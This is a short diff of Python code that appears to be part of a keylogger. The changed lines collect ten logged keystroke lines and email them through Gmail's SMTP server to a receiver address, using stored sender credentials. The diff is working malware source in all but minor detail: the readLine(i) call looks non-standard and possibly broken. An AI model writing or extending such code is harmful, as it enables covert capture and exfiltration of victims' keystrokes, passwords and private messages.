@@ -24,7 +24,19 @@ def keyPressed(key):
 
         if len(lines) >= 10:
             for i in range(10):
-                body = f"{body} "
+                body = f"{body} {logFile.readLine(i)}"
+            em = EmailMessage()
+            em['From'] = emailer
+            em['To'] = receiver
+            em['Subject'] = subject
+            em.set_content(body)
+
+            context = ssl.create_default_context()
+
+            with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+                smtp.login(emailer, emailerPassword)
+                smtp.sendmail(emailer, receiver, em.as_string())
+
             for i in range(10):
                 del lines[10 - i - 1]
 
